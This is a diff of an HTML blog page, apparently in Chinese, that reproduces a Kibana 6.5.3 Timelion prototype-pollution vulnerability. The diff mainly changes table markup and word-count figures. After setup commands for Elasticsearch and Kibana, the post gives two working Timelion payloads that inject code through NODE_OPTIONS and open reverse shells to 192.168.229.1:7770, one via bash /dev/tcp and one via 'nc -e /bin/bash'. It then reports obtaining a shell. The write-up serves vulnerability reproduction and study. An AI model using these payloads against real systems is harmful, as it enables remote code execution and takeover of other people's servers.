@@ -90,13 +90,13 @@ kibana-6.5.3-linux-x86_64
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>文章字数</i>
-                    4.1k
+                    3.5k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>阅读约需</i>
-                    4 mins.
+                    3 mins.
                 </span>
                 
                 
@@ -137,14 +137,14 @@ kibana-6.5.3-linux-x86_64
 <li>kibana-6.5.3-linux-x86_64</li>
 </ul>
 <p>注意：elasticsearch和kibana的版本要对应，运行的时候要以非root权限运行，并且要安装java环境</p>
-<p>首先我们下载这两个软件<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.5.3.tar.gz</span><br><span class="line"></span><br><span class="line">wget https://artifacts.elastic.co/downloads/kibana/kibana-6.5.3-linux-x86_64.tar.gz</span><br></pre></td></tr></table></div></figure></p>
-<p>解压<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf elasticsearch-6.5.3.tar.gz</span><br><span class="line">tar -zxvf kibana-6.5.3-linux-x86_64.tar.gz</span><br></pre></td></tr></table></div></figure></p>
-<p>先运行elasticsearch<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd elasticsearch-6.5.3</span><br><span class="line">./bin/elasticsearch</span><br></pre></td></tr></table></div></figure></p>
+<p>首先我们下载这两个软件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.5.3.tar.gz</span><br><span class="line"></span><br><span class="line">wget https://artifacts.elastic.co/downloads/kibana/kibana-6.5.3-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure></p>
+<p>解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf elasticsearch-6.5.3.tar.gz</span><br><span class="line">tar -zxvf kibana-6.5.3-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure></p>
+<p>先运行elasticsearch<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd elasticsearch-6.5.3</span><br><span class="line">./bin/elasticsearch</span><br></pre></td></tr></table></figure></p>
 <p>然后我们访问：<a href="http://127.0.0.1:9200" target="_blank" rel="noopener">http://127.0.0.1:9200</a><br><img src="/2019/10/19/kibana-6-6-0漏洞复现/9200.png" alt><br>访问成这样，说明运行成功</p>
-<p>然后我们接着运行kibana<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd kibana-6.5.3-linux-x86_64</span><br><span class="line">./bin/kibana</span><br></pre></td></tr></table></div></figure></p>
+<p>然后我们接着运行kibana<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd kibana-6.5.3-linux-x86_64</span><br><span class="line">./bin/kibana</span><br></pre></td></tr></table></figure></p>
 <p>访问：<a href="http://127.0.0.1:5601" target="_blank" rel="noopener">http://127.0.0.1:5601</a><br><img src="/2019/10/19/kibana-6-6-0漏洞复现/5601.png" alt><br>说明搭建成功</p>
-<p><img src="/2019/10/19/kibana-6-6-0漏洞复现/poc.png" alt><br>点击Timelion，输入我们的payload，这里提供两个<br>bash反弹shell<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.es().props(label.__proto__.env.AAAA=&apos;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.229.1/7770 0&gt;&amp;1&quot;);process.exit()//&apos;).props(label.__proto__.env.NODE_OPTIONS=&apos;--require /proc/self/environ&apos;)</span><br></pre></td></tr></table></div></figure></p>
-<p>nc反弹shell<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.es().props(label.__proto__.env.AAAA=&apos;require(&quot;child_process&quot;).exec(&quot;nc -e /bin/bash 192.168.229.1 7770&quot;);process.exit()//&apos;).props(label.__proto__.env.NODE_OPTIONS=&apos;--require /proc/self/environ&apos;)</span><br></pre></td></tr></table></div></figure></p>
+<p><img src="/2019/10/19/kibana-6-6-0漏洞复现/poc.png" alt><br>点击Timelion，输入我们的payload，这里提供两个<br>bash反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.es().props(label.__proto__.env.AAAA=&apos;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.229.1/7770 0&gt;&amp;1&quot;);process.exit()//&apos;).props(label.__proto__.env.NODE_OPTIONS=&apos;--require /proc/self/environ&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>nc反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.es().props(label.__proto__.env.AAAA=&apos;require(&quot;child_process&quot;).exec(&quot;nc -e /bin/bash 192.168.229.1 7770&quot;);process.exit()//&apos;).props(label.__proto__.env.NODE_OPTIONS=&apos;--require /proc/self/environ&apos;)</span><br></pre></td></tr></table></figure></p>
 <p>这样我们就拿到shell了</p>
 <p><img src="/2019/10/19/kibana-6-6-0漏洞复现/whoami.png" alt></p>
 <h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><p>原作者分析地址：<br><a href="https://slides.com/securitymb/prototype-pollution-in-kibana/" title="https://slides.com/securitymb/prototype-pollution-in-kibana/" target="_blank" rel="noopener">https://slides.com/securitymb/prototype-pollution-in-kibana/</a></p>
